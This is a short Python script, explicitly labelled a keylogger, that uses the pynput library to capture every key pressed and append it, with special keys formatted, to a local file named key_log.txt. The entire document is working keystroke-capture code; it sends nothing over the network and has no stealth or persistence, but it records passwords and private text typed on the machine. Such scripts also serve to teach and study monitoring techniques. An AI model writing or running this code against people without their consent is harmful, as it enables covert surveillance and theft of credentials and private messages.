from pynput.keyboard import Listener

# Define the log file name
log_file = "key_log.txt"

# Ensure the log file is created
with open(log_file, "w") as f:
    f.write("Keylogger Started...\n")

# Function to save keys in a file
def save_key(key):
    key = str(key).replace("'", "")  # Remove quotes around characters
    if key == "Key.space":
        key = " "  # Replace 'Key.space' with an actual space
    elif key == "Key.enter":
        key = "\n"  # Replace 'Key.enter' with a new line
    elif "Key." in key:
        key = f"[{key}]"  # Format special keys
    
    # Append key to the file
    with open(log_file, "a") as f:
        f.write(key)

# Start listening to keyboard events
with Listener(on_press=save_key) as listener:
    listener.join()
